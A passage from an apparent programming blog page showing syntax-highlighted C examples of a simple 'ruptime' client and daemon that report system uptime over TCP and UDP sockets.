i++)<br>close(i);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attach file descriptors 0, 1, and 2 to /dev/null.</span><br><span class="hljs-comment"> */</span><br>fd0 = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR);<br>fd1 = dup(<span class="hljs-number">0</span>);<br>fd2 = dup(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Initialize the log file.</span><br><span class="hljs-comment"> */</span><br>openlog(cmd, LOG_CONS, LOG_DAEMON);<br><span class="hljs-keyword">if</span> (fd0 != <span class="hljs-number">0</span> || fd1 != <span class="hljs-number">1</span> || fd2 != <span class="hljs-number">2</span>) &#123;<br>syslog(LOG_ERR, <span class="hljs-string">&quot;unexpected file descriptors %d %d %d&quot;</span>,<br>  fd0, fd1, fd2);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">serve</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd)</span><br>&#123;<br>    <span class="hljs-type">int</span> clfd, status;<br>    <span class="hljs-type">pid_t</span> pid;<br><br>    set_cloexec(sockfd);<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-keyword">if</span> ((clfd = accept(sockfd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &lt; <span class="hljs-number">0</span>)&#123;<br>            syslog(LOG_ERR, <span class="hljs-string">&quot;ruptimed: accept error: %s&quot;</span>, strerror(errno));<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>((pid = fork()) &lt; <span class="hljs-number">0</span>)&#123;<br>            syslog(LOG_ERR, <span class="hljs-string">&quot;ruptimed: fork error: %s&quot;</span>,strerror(errno));<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span>(dup2(clfd, STDOUT_FILENO) != STDOUT_FILENO ||<br>                dup2(clfd, STDERR_FILENO) != STDERR_FILENO) &#123;<br>                    syslog(LOG_ERR, <span class="hljs-string">&quot;ruptimed: unexpected error&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>                &#125;<br>        close(clfd);<br>        execl(<span class="hljs-string">&quot;/usr/bin/uptime&quot;</span>, <span class="hljs-string">&quot;uptime&quot;</span>, (<span class="hljs-type">char</span> *)<span class="hljs-number">0</span>);<br>        syslog(LOG_ERR, <span class="hljs-string">&quot;ruptimed: uunexpecred return from exec: %s&quot;</span>, strerror(errno));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            close(clfd);<br>            waitpid(pid, &amp;status, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125; <br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> *<span class="hljs-title">ailist</span>, *<span class="hljs-title">aip</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> <span class="hljs-title">hint</span>;</span><br>    <span class="hljs-type">int</span> sockfd, err, n;<br>    <span class="hljs-type">char</span> *host;<br>    <br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usgae: ruptimed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((n = sysconf(_SC_HOST_NAME_MAX)) &lt; <span class="hljs-number">0</span>)<br>        n = HOST_NAME_MAX;<br>    <span class="hljs-keyword">if</span> ((host = <span class="hljs-built_in">malloc</span>(n)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (gethostname(host, n) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;gethostname error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    daemonize(<span class="hljs-string">&quot;ruptimed&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(&amp;hint, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(hint));<br>    hint.ai_flags = AI_CANONNAME;<br>    hint.ai_socktype = SOCK_STREAM;<br>    hint.ai_canonname = <span class="hljs-literal">NULL</span>;<br>    hint.ai_addr = <span class="hljs-literal">NULL</span>;<br>    hint.ai_next = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> ((err = getaddrinfo(host, <span class="hljs-string">&quot;ruptime&quot;</span>, &amp;hint, &amp;ailist)) != <span class="hljs-number">0</span>) &#123;<br>        syslog(LOG_ERR, <span class="hljs-string">&quot;ruptimed: getaddrinfo error: %s&quot;</span>,gai_strerror(err));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (aip = ailist; aip != <span class="hljs-literal">NULL</span>; aip = aip-&gt;ai_next) &#123;<br>        <span class="hljs-keyword">if</span> ((sockfd = initserver(SOCK_STREAM, aip-&gt;ai_addr, aip-&gt;ai_addrlen, QLEN)) &gt;= <span class="hljs-number">0</span>) &#123;<br>            serve(sockfd);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>16-19.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFLEN 128  </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TIMEOUT 20</span><br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">sigalrm</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><br>&#123;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_uptime</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-keyword">struct</span> addrinfo *aip)</span><br>&#123;<br>    <span class="hljs-type">int</span> n;;<br>    <span class="hljs-type">char</span> buf[BUFLEN];<br><br>    buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (sendto(sockfd, buf, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, aip-&gt;ai_addr, aip-&gt;ai_addrlen) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;sento error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    alarm(TIMEOUT);<br>    <span class="hljs-keyword">if</span> ((n = recvfrom(sockfd, buf, BUFLEN, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &lt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span> (errno != EINTR)<br>            alarm(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;recv error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    alarm(<span class="hljs-number">0</span>);<br>    write(STDOUT_FILENO, buf, n);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> *<span class="hljs-title">ailist</span>, *<span class="hljs-title">aip</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> <span class="hljs-title">hint</span>;</span><br>    <span class="hljs-type">int</span> sockfd, err;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span><br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: ruptime hostname&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    sa.sa_handler = sigalrm;<br>    sa.sa_flags = <span class="hljs-number">0</span>;<br>    sigemptyset(&amp;sa.sa_mask);<br>    <span class="hljs-keyword">if</span> (sigaction(SIGALRM, &amp;sa, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;sigaction error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(&amp;hint, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(hint));<br>    hint.ai_socktype = SOCK_DGRAM; <span class="hljs-comment">//过滤模板</span><br>    hint.ai_canonname = <span class="hljs-literal">NULL</span>;<br>    hint.ai_addr = <span class="hljs-literal">NULL</span>;<br>    hint.ai_next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((err = getaddrinfo(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;ruptime&quot;</span>, &amp;hint, &amp;ailist)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;getaddrinfo error :%s&quot;</span>,gai_strerror(err));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (aip = ailist; aip != <span class="hljs-literal">NULL</span>; aip = aip-&gt;ai_next) &#123;<br>        <span class="hljs-keyword">if</span> ((sockfd = socket(aip-&gt;ai_family, SOCK_DGRAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            err = errno;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            print_uptime(sockfd, aip);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t contact %s: %s\n&quot;</span>, argv[<span class="hljs-number">1</span>], strerror(err));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>16-20.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syslog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFLEN 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXADDRLEN 256</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> HOST_NAME_MAX</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HOST_NAME_MAX 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">initserver</span><span class="hljs-params">(<span class="hljs-type">int</span> , <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *, <span class="hljs-type">socklen_t</span>, <span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">daemonize</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd)</span><br>&#123;<br><span class="hljs-type">int</span>i, fd0, fd1, fd2;<br><span class="hljs-type">pid_t</span>pid;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span><span class="hljs-title">rl</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span><span class="hljs-title">sa</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Clear file creation mask.</span><br><span class="hljs-comment"> */</span><br>umask(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Get maximum number of file descriptors.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;rl) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t get file limit&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Become a session leader to lose controlling TTY.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t fork&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) <span class="hljs-comment">/* parent */</span><br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>setsid();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ensure future opens won&#x27;t allocate controlling TTYs.</span><br><span class="hljs-comment"> */</span><br>sa.sa_handler = SIG_IGN;<br>sigemptyset(&amp;sa.sa_mask);<br>sa.sa_flags = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (sigaction(SIGHUP, &amp;sa, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t ignore SIGHUP&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t fork&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) <span class="hljs-comment">/* parent */</span><br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Change the current working directory to the root so</span><br><span class="hljs-comment"> * we won&#x27;t prevent file systems from being unmounted.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (chdir(<span class="hljs-string">&quot;/&quot;</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: can&#x27;t change directory to /&quot;</span>, cmd);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Close all open file descriptors.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (rl.rlim_max == RLIM_INFINITY)<br>rl.rlim_max = <span class="hljs-number">1024</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; rl.rlim_max; i++)<br>close(i);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attach file descriptors 0, 1, and 2 to /dev/null.</span><br><span class="hljs-comment"> */</span><br>fd0 = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR);<br>fd1 = dup(<span class="hljs-number">0</span>);<br>fd2 = dup(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Initialize the log file.</span><br><span class="hljs-comment"> */</span><br>openlog(cmd, LOG_CONS, LOG_DAEMON);<br><span class="hljs-keyword">if</span> (fd0 != <span class="hljs-number">0</span> || fd1 != <span class="hljs-number">1</span> || fd2 != <span class="hljs-number">2</span>) &#123;<br>syslog(LOG_ERR, <span class="hljs-string">&quot;unexpected file descriptors %d %d %d&quot;</span>,<br>  fd0, fd1, fd2);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">serve</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd)</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">socklen_t</span> alen;<br>    FILE *fp;<br>    <span class="hljs-type">char</span> buf[BUFLEN];<br>    <span class="hljs-type">char</span> abuf[MAXADDRLEN];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">addr</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr *)abuf;<br><br>    set_cloexec(sockfd);<br>    <span class="hljs-keyword">for</span>(;;) &#123;<br>        alen = MAXADDRLEN;<br>        <span class="hljs-keyword">if</span> ((n = recvfrom(sockfd, buf, BUFLEN, <span class="hljs-number">0</span>, addr, &amp;alen)) &lt; <span class="hljs-number">0</span>) &#123;<br>            syslog(LOG_ERR, <span class="hljs-string">&quot;ruptimed: recvfrom error :%s&quot;</span>, strerror(errno));<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((fp = popen(<span class="hljs-string">&quot;/usr/bin/uptime&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;error: %s\n&quot;</span>, strerror(errno));<br>            sendto(sockfd, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>, addr, alen);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (fgets(buf, BUFLEN, fp) != <span class="hljs-literal">NULL</span>)<br>                sendto(sockfd, buf, <span class="hljs-built_in">strlen</span>(buf), <span class="hljs-number">0</span>, addr, alen);<br>            pclose(fp);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> *<span class="hljs-title">ailist</span>, *<span class="hljs-title">aip</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> <span class="hljs-title">hint</span>;</span><br>    <span class="hljs-type">int</span> sockfd, err, n;<br>    <span class="hljs-type">char</span> *host;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: ruptimed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((n = sysconf(_SC_HOST_NAME_MAX)) &lt; <span class="hljs-number">0</span>)<br>        n = HOST_NAME_MAX;<br>    <span class="hljs-keyword">if</span> ((host = <span class="hljs-built_in">malloc</span>(n)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (gethostname(host, n) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;gethostname error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    daemonize(<span class="hljs-string">&quot;ruptimed&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(&amp;hint, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(hint));<br>    hint.ai_flags = AI_CANONNAME;<br>    hint.ai_socktype = SOCK_DGRAM;<br>    hint.ai_canonname = <span class="hljs-literal">NULL</span>;<br>    hint.ai_addr = <span class="hljs-literal">NULL</span>;<br>    hint.ai_next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((err = getaddrinfo(host, <span class="hljs-string">&quot;ruptime&quot;</span>, &amp;hint, &amp;ailist)) != <span class="hljs-number">0</span>)&#123;<br>        syslog(LOG_ERR, <span class="hljs-string">&quot;ruptimed: getaddrinfo error:%s&quot;</span>, gai_strerror(err));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (aip = ailist; aip != <span class="hljs-literal">NULL</span>; aip = aip-&gt;ai_next) &#123;<br>        <span class="hljs-keyword">if</span> ((sockfd = initserver(SOCK_DGRAM, aip-&gt;ai_addr, aip-&gt;ai_addrlen, <span class="hljs-number">0</span>)) &gt;= <span class="hljs-number">0</span>)&#123;<br>            serve(sockfd);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span 